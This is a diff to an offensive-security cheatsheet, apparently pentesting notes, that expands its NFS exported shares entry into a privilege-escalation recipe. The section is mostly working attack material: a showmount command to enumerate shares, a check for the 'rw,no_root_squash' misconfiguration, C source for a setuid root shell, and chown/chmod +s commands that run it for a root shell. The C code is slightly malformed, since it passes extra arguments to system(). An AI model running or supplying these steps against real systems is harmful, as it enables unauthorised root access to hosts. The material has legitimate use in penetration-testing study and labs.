@@ -45,11 +45,30 @@ curl -vX $TARGET
 
 ### NFS Exported Shares
 
-List NFS exported shares. If 'rw,no\_root\_squash' is present, upload and execute [sid-shell](https://github.com/mantvydasb/Offensive-Security-Cheatsheets/blob/master/sid-shell.c)
+List NFS exported shares:
 
 ```bash
 showmount -e 192.168.110.102
-chown root:root sid-shell; chmod +s sid-shell
+```
+
+...and check if `'rw,no_root_squash'` is present. If it is present, compile the below `sid-shell.c`:
+
+{% code title="sid-shell.c" %}
+```cpp
+#include <unistd.h>
+
+main( int argc, char ** argv, char ** envp )
+{
+    setgid(0); setuid(0); system("/bin/bash", argv, envp);
+    return 0;
+}
+```
+{% endcode %}
+
+...upload it to the share and execute the below to launch `sid-shell` to spawn a root shell:
+
+```bash
+chown root:root sid-shell; chmod +s sid-shell; ./sid-shell
 ```
 
 ### Kerberos Enumeration
